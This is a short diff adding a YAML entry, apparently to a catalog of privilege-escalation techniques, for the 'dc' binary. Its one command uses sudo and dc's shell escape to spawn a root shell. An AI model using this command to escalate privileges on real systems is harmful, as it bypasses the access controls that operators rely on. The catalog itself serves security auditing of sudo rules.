@@ -1,0 +1,4 @@
+name: dc
+binary_path: /usr/bin/dc
+exploit_cmds:
+- sudo /usr/bin/dc -e '!/bin/sh'
